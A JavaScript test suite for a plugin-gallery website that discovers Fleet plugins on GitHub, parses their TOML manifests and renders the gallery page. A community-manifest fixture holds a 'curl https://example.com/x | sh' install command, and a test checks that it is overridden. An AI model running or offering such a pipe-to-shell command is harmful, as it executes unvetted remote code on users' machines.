import assert from 'node:assert/strict';
import { runInNewContext } from 'node:vm';
import { test } from 'node:test';
import { mkdir, mkdtemp, readFile, rm } from 'node:fs/promises';
import Eleventy from '@11ty/eleventy';
import { parse } from 'node-html-parser';
import { TOPIC, SEARCH_QUERY, collectGallery, loadGallery, validateGallery } from './fleet-plugins-gallery.mjs';
import { validateOverlay } from './validate-mods.mjs';

const API = 'https://api.github.com';
const RAW = 'https://raw.githubusercontent.com';

const repository = (fullName, extra = {}) => ({
  full_name: fullName,
  name: fullName.split('/')[1],
  owner: { login: fullName.split('/')[0] },
  html_url: `https://github.com/${fullName}`,
  description: `${fullName} <b>description</b>`,
  stargazers_count: 3,
  pushed_at: '2026-11-20T10:00:00Z',
  created_at: '2026-09-01T10:00:00Z',
  default_branch: 'main',
  topics: ['fleet', TOPIC],
  fork: false,
  archived: false,
  private: false,
  ...extra,
});

const reviewer = repository('Thurbeen/fleet-reviewer', { stargazers_count: 9 });
const tickets = repository('alice/fleet-tickets', { default_branch: 'trunk' });

const reviewerManifest = `
name = "fleet-reviewer"
version = "0.1.0"
requires_fleet = ">=3.0.0"
kinds = ["ReviewSource", "Review"]

[gallery]
install = "git clone https://github.com/Thurbeen/fleet-reviewer /opt/fleet-plugins/fleet-reviewer"
platforms = ["Linux", "macOS"]
notes = "Needs Node.js 22.18."
`;

const ticketsManifest = `
name = "tickets"
description = "Tickets from the manifest"
kinds = ["Ticket", "not a kind", 7, "TicketBoard"]

[gallery]
install = "curl https://example.com/x | sh"
media = "shots/board.png"
media_alt = "A ticket board"
`;

function response(status, body) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: new Headers(),
    json: async () => body,
    text: async () => (typeof body === 'string' ? body : JSON.stringify(body)),
  };
}

function githubMock(overrides = {}) {
  const calls = [];
  const routes = {
    search: () =>
      response(200, { total_count: 2, incomplete_results: false, items: [reviewer, tickets] }),
    [`${RAW}/Thurbeen/fleet-reviewer/main/fleet-plugin.toml`]: () =>
      response(200, reviewerManifest),
    [`${RAW}/Thurbeen/fleet-reviewer/main/media/demo.gif`]: () => response(404, ''),
    [`${RAW}/alice/fleet-tickets/trunk/fleet-plugin.toml`]: () => response(200, ticketsManifest),
    ...overrides,
  };
  const request = async (url, init = {}) => {
    calls.push({ url: String(url), init });
    const parsed = new URL(url);
    if (parsed.origin + parsed.pathname === `${API}/search/repositories`)
      return routes.search(parsed);
    const route = routes[String(url)];
    if (!route) return response(404, '');
    return route(parsed);
  };
  return { request, calls };
}

test('the topic is distinctive and the search excludes forks and archived repositories', () => {
  assert.equal(SEARCH_QUERY, `topic:${TOPIC} is:public fork:false archived:false`);
  assert.notEqual(TOPIC, 'thurbox-mods');
  assert.match(TOPIC, /^thurbox-/);
});

test('discovers Fleet plugins by topic and reads their kinds from fleet-plugin.toml', async () => {
  const { request, calls } = githubMock();
  const gallery = await collectGallery({ curated: [], request, token: 'secret-token' });

  const search = new URL(calls.find((c) => c.url.includes('/search/repositories')).url);
  assert.equal(search.searchParams.get('q'), SEARCH_QUERY);
  assert.deepEqual(
    gallery.map((p) => p.fullName),
    ['Thurbeen/fleet-reviewer', 'alice/fleet-tickets'],
  );
  const [official, community] = gallery;

  assert.equal(official.official, true);
  assert.deepEqual(official.kinds, ['ReviewSource', 'Review']);
  assert.equal(official.version, '0.1.0');
  assert.equal(official.requiresFleet, '>=3.0.0');
  assert.deepEqual(official.topics, ['fleet']);
  assert.deepEqual(official.platforms, ['Linux', 'macOS']);
  assert.equal(official.notes, 'Needs Node.js 22.18.');
  assert.equal(
    official.install,
    'git clone https://github.com/Thurbeen/fleet-reviewer /opt/fleet-plugins/fleet-reviewer',
  );
  assert.equal(official.media, null);

  assert.equal(community.official, false);
  assert.deepEqual(community.kinds, ['Ticket', 'TicketBoard'], 'only CamelCase kind names');
  assert.equal(
    community.install,
    'git clone https://github.com/alice/fleet-tickets /opt/fleet-plugins/fleet-tickets',
    'a community manifest cannot set the install command',
  );
  assert.deepEqual(community.media, {
    url: `${RAW}/alice/fleet-tickets/trunk/shots/board.png`,
    alt: 'A ticket board',
  });
  assert.equal(community.requiresFleet, null);
  assert.deepEqual(validateGallery(gallery), []);
});

test('a repository without fleet-plugin.toml is listed with no kinds', async () => {
  const { request } = githubMock({
    [`${RAW}/alice/fleet-tickets/trunk/fleet-plugin.toml`]: () => response(404, ''),
  });
  const gallery = await collectGallery({ curated: [], request });
  assert.deepEqual(gallery[1].kinds, []);
  assert.equal(gallery[1].description, 'alice/fleet-tickets <b>description</b>');
  assert.deepEqual(validateGallery(gallery), []);
});

test('a failed discovery falls back to the snapshot, filtered by the overlay', async () => {
  const snapshot = [
    { fullName: 'spam/fleet-ads', repo: 'https://github.com/spam/fleet-ads', install: 'x' },
    { fullName: 'snap/shot', repo: 'https://github.com/snap/shot', install: 'kept' },
  ];
  const curated = [{ repo: 'https://github.com/spam/fleet-ads', hidden: true }];
  const { request } = githubMock({ search: () => response(403, {}) });
  const warnings = [];
  const gallery = await loadGallery({
    curated,
    snapshot,
    request,
    env: {},
    warn: (m) => warnings.push(m),
  });
  assert.deepEqual(
    gallery.map((p) => p.fullName),
    ['snap/shot'],
  );
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /fleet-plugins-snapshot\.json/);
});

test('the committed snapshot and overlay are valid and list fleet-reviewer', async () => {
  const snapshot = JSON.parse(await readFile('website/fleet-plugins-snapshot.json', 'utf8'));
  const overlay = JSON.parse(await readFile('website/_data/fleet-plugins.json', 'utf8'));
  assert.deepEqual(validateGallery(snapshot), []);
  assert.deepEqual(validateOverlay(overlay), []);
  const reviewerEntry = snapshot.find((p) => p.fullName === 'Thurbeen/fleet-reviewer');
  assert.ok(reviewerEntry, 'fleet-reviewer is in the snapshot');
  assert.equal(reviewerEntry.official, true);
  assert.deepEqual(reviewerEntry.kinds, ['ReviewSource', 'Review']);
});

function siteMock(url) {
  const { pathname } = new URL(url);
  const reply = (status, body) => ({
    ok: status === 200,
    status,
    json: async () => body,
    text: async () => body,
  });
  if (pathname === '/search/repositories') {
    const q = new URL(url).searchParams.get('q');
    if (!q.includes(TOPIC))
      return reply(200, { total_count: 0, incomplete_results: false, items: [] });
    return reply(200, { total_count: 2, incomplete_results: false, items: [reviewer, tickets] });
  }
  if (pathname === '/Thurbeen/fleet-reviewer/main/fleet-plugin.toml')
    return reply(200, reviewerManifest);
  if (pathname === '/alice/fleet-tickets/trunk/fleet-plugin.toml')
    return reply(200, ticketsManifest);
  return reply(404, '');
}

test('the Fleet plugins page renders each plugin, its kinds, install and controls', async () => {
  await mkdir('tmp', { recursive: true });
  const output = await mkdtemp('tmp/fleet-plugins-site-');
  const realFetch = globalThis.fetch;
  const offline = process.env.THURBOX_GALLERY_OFFLINE;
  globalThis.fetch = async (url) => siteMock(url);
  delete process.env.THURBOX_GALLERY_OFFLINE;
  try {
    const site = new Eleventy('website', output, {
      source: 'cli',
      configPath: 'eleventy.config.js',
      config: (config) => config.setUseGitIgnore(false),
    });
    await site.write();
    const root = parse(await readFile(`${output}/fleet-plugins.html`, 'utf8'));
    assert.equal(root.querySelector('h1').textContent, 'Fleet plugins');
    assert.match(root.querySelector('title').textContent, /Fleet plugins/);
    const current = root.querySelector('.nav-links a[aria-current="page"]');
    assert.equal(current.getAttribute('href'), './fleet-plugins.html');

    const cards = root.querySelectorAll('[data-plugin]');
    assert.deepEqual(
      cards.map((c) => c.querySelector('h2').textContent),
      ['fleet-reviewer', 'fleet-tickets'],
    );
    const [official, community] = cards;
    assert.equal(official.querySelector('.plugin-badge').textContent, 'Official');
    assert.equal(community.querySelector('.plugin-badge').textContent, 'Community');
    assert.deepEqual(
      official.querySelectorAll('.plugin-kinds code').map((c) => c.textContent),
      ['ReviewSource', 'Review'],
    );
    assert.match(official.textContent, />=3\.0\.0/);
    assert.ok(official.innerHTML.includes('Thurbeen/fleet-reviewer &lt;b&gt;description'));
    assert.equal(
      parse(community.querySelector('pre').innerHTML).textContent,
      'git clone https://github.com/alice/fleet-tickets /opt/fleet-plugins/fleet-tickets',
    );
    assert.equal(community.querySelector('.plugin-preview img').getAttribute('alt'), 'A ticket board');
    assert.equal(root.querySelector('#plugin-count').textContent, '2 plugins');

    const submit = root.querySelector('#submit-plugin');
    const toml = parse(submit.querySelector('pre').innerHTML).textContent;
    for (const field of ['kinds', 'requires_fleet', '[gallery]', 'media', 'platforms', 'notes'])
      assert.ok(toml.includes(field), field);
    assert.ok(submit.querySelector(`a[href="https://github.com/topics/${TOPIC}"]`));
    assert.ok(root.querySelector('a[href="./docs/fleet/plugins.html"]'), 'links the plugin guide');
    assert.ok(root.querySelector('a[href="./mods.html"]'), 'points to thurbox mods');

    const mods = parse(await readFile(`${output}/mods.html`, 'utf8'));
    assert.ok(mods.querySelector('.nav-links a[href="./fleet-plugins.html"]'));
    assert.equal(mods.querySelectorAll('#plugin-grid [data-plugin]').length, 0);

    const events = {};
    const form = root.querySelector('#plugin-filters');
    form.addEventListener = (event, handler) => {
      events[event] = handler;
    };
    const search = root.querySelector('#plugin-search');
    const sort = root.querySelector('#plugin-sort');
    const badge = root.querySelector('#plugin-badge');
    search.value = badge.value = '';
    sort.value = 'popular';
    runInNewContext(await readFile('website/js/gallery.js', 'utf8'), {
      document: {
        getElementById: (id) => root.querySelector(`#${id}`),
        querySelectorAll: (selector) => root.querySelectorAll(selector),
      },
      setTimeout: (handler) => handler(),
    });
    search.value = 'ticketboard';
    events.input();
    assert.deepEqual(
      cards.map((card) => card.hidden),
      [true, false],
      'search matches kinds',
    );
    assert.equal(root.querySelector('#plugin-count').textContent, '1 of 2 plugins');
  } finally {
    globalThis.fetch = realFetch;
    if (offline !== undefined) process.env.THURBOX_GALLERY_OFFLINE = offline;
    await rm(output, { recursive: true, force: true });
  }
});

test('the gallery digest changes with the commit or with either gallery, and only then', async () => {
  const { galleryDigest } = await import('./gallery.mjs');
  const base = { commit: 'abc', galleries: { mods: [{ fullName: 'a/b', stars: 1 }], plugins: [] } };
  const digest = galleryDigest(base);
  assert.match(digest, /^[0-9a-f]{64}$/);
  assert.equal(galleryDigest(structuredClone(base)), digest);
  assert.notEqual(galleryDigest({ ...base, commit: 'def' }), digest);
  assert.notEqual(
    galleryDigest({ ...base, galleries: { ...base.galleries, plugins: [{ fullName: 'c/d' }] } }),
    digest,
  );
  assert.notEqual(
    galleryDigest({ ...base, galleries: { ...base.galleries, mods: [{ fullName: 'a/b', stars: 2 }] } }),
    digest,
  );
});
